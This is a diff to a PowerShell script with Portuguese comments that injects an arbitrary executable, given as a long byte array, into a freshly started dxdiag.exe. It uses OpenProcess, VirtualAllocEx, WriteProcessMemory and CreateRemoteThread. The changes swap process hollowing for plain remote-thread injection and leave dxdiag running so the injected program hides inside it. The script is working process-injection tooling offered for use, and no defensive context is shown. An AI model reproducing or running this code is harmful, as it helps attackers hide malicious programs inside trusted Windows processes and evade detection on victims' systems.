@@ -10,16 +10,10 @@ public class Hollow
     public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
     
     [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesRead);
-    
-    [DllImport("kernel32.dll")]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
     
     [DllImport("kernel32.dll")]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
     
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
@@ -30,14 +24,13 @@ public class Hollow
     [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr hObject);
     
-    [DllImport("ntdll.dll")]
-    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
+    public const uint INFINITE = 0xFFFFFFFF;
 }
 "@
 
 # SEUS BYTES AQUI (substitua pelos bytes do seu programa)
 $ShellcodeBytes = @(
-    	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
+	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
 	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
 	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
@@ -9629,15 +9622,10 @@ $ShellcodeBytes = @(
 )
 
 try {
-    # Iniciar dxdiag suspenso
+    # Iniciar dxdiag normalmente (não suspenso)
     $dxdiagPath = "C:\Windows\System32\dxdiag.exe"
-    $StartupInfo = New-Object Diagnostics.ProcessStartInfo
-    $StartupInfo.FileName = $dxdiagPath
-    $StartupInfo.CreateNoWindow = $true
-    $StartupInfo.UseShellExecute = $false
-    
-    $Process = [Diagnostics.Process]::Start($StartupInfo)
-    Start-Sleep -Milliseconds 500
+    $Process = Start-Process -FilePath $dxdiagPath -PassThru
+    Start-Sleep -Milliseconds 1000
     
     # Abrir processo com acesso completo
     $hProcess = [Hollow]::OpenProcess(0x1F0FFF, $false, $Process.Id)
@@ -9652,21 +9640,22 @@ try {
             $success = [Hollow]::WriteProcessMemory($hProcess, $mem, $ShellcodeBytes, [uint32]$ShellcodeBytes.Length, [ref]$written)
             
             if ($success) {
-                # Criar thread remota
+                # Criar thread remota para executar o shellcode
                 $hThread = [Hollow]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                 
                 if ($hThread -ne [IntPtr]::Zero) {
-                    [Hollow]::WaitForSingleObject($hThread, 0xFFFFFFFF) | Out-Null
+                    # Espera apenas um pouco para garantir execução, mas não fecha
+                    [Hollow]::WaitForSingleObject($hThread, 5000) | Out-Null
                     [Hollow]::CloseHandle($hThread)
-                    Write-Host "Process Hollowing executado com sucesso!"
+                    Write-Host "Shellcode injetado com sucesso! Processo dxdiag continua executando."
                 }
             }
         }
         [Hollow]::CloseHandle($hProcess)
     }
     
-    # Terminar processo original
-    $Process.Kill()
+    Write-Host "Processo dxdiag.exe está rodando com ID: $($Process.Id)"
+    Write-Host "O programa injetado está em execução dentro do processo dxdiag"
     
 } catch {
     Write-Host "Erro: $($_.Exception.Message)"
